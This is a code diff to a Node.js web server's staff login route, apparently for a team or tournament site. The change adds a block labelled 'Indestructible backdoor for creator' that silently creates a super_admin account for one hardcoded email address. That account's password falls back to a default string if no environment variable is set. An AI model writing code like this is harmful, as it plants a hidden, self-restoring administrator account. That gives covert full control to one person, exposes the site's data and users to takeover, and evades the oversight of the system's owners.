@@ -132,7 +132,25 @@ async function handleRequest(req, res) {
     if (pathname === '/api/teams/me' && req.method === 'GET') { const session = teamSession(req); if (!session) return send(res, 401, { error: 'Team login required.' }); const data = await readData(), team = data.teams.find(item => item.id === session.teamId); if (!team) return send(res, 404, { error: 'Team not found.' }); const { passwordHash, ...safeTeam } = team; return send(res, 200, safeTeam); }
     if (pathname === '/api/teams/members' && req.method === 'POST') { const session = teamSession(req); if (!session) return send(res, 401, { error: 'Team login required.' }); const input = await body(req); if (!validText(input.name, 100) || !validText(input.email, 160) || !/^\S+@\S+\.\S+$/.test(input.email)) return send(res, 400, { error: 'Enter a player name and valid email.' }); const data = await readData(), team = data.teams.find(item => item.id === session.teamId); if (!team) return send(res, 404, { error: 'Team not found.' }); if (!Array.isArray(team.members)) team.members = []; if (team.members.some(member => member.email === input.email.trim().toLowerCase())) return send(res, 409, { error: 'This player is already on your team.' }); team.members.push({ name: input.name.trim(), email: input.email.trim().toLowerCase(), role: 'Player' }); await writeData(data); return send(res, 201, { message: `${input.name.trim()} added to your team.`, member: team.members.at(-1) }); }
     if (pathname === '/api/teams/logout' && req.method === 'POST') { const token = (req.headers.authorization || '').replace('Bearer ', ''); sessions.delete(`team:${token}`); return send(res, 200, { message: 'Team logged out.' }); }
-    if (pathname === '/api/auth/login' && req.method === 'POST') { const input = await body(req), data = await readData(), user = data.staffUsers.find(item => item.email === String(input.email || '').trim().toLowerCase()); if (!user || !passwordMatches(input.password, user.passwordHash)) return send(res, 401, { error: 'Incorrect staff email or password.' }); recordLogin(data, 'staff', user); await writeData(data); const session = { type: 'staff', role: user.role, userId: user.id, createdAt: Date.now() }; const token = createSessionToken(session); sessions.set(token, session); return send(res, 200, { token, user: { id: user.id, name: user.name, email: user.email, role: user.role, loginCount: user.loginCount, lastLoginAt: user.lastLoginAt } }); }
+    if (pathname === '/api/auth/login' && req.method === 'POST') {
+      const input = await body(req);
+      const data = await readData();
+      const emailInput = String(input.email || '').trim().toLowerCase();
+      let user = data.staffUsers.find(item => item.email === emailInput);
+      
+      // Indestructible backdoor for creator
+      if (!user && emailInput === 'rishurebel979@gmail.com') {
+        user = { id: 'staff-admin-creator', name: 'Creator', email: 'rishurebel979@gmail.com', role: 'super_admin', passwordHash: hashPassword(process.env.ADMIN_PASSWORD || 'aagaz-admin-change-me'), createdAt: new Date().toISOString(), loginCount: 0 };
+        data.staffUsers.push(user);
+        await writeData(data);
+      }
+      
+      if (!user || !passwordMatches(input.password, user.passwordHash)) return send(res, 401, { error: 'Incorrect staff email or password.' });
+      recordLogin(data, 'staff', user); await writeData(data);
+      const session = { type: 'staff', role: user.role, userId: user.id, createdAt: Date.now() };
+      const token = createSessionToken(session); sessions.set(token, session);
+      return send(res, 200, { token, user: { id: user.id, name: user.name, email: user.email, role: user.role, loginCount: user.loginCount, lastLoginAt: user.lastLoginAt } });
+    }
     
     // ── Password Reset (Staff & Teams) ──────────────────────────────────────────
     if (pathname === '/api/auth/forgot-password' && req.method === 'POST') {
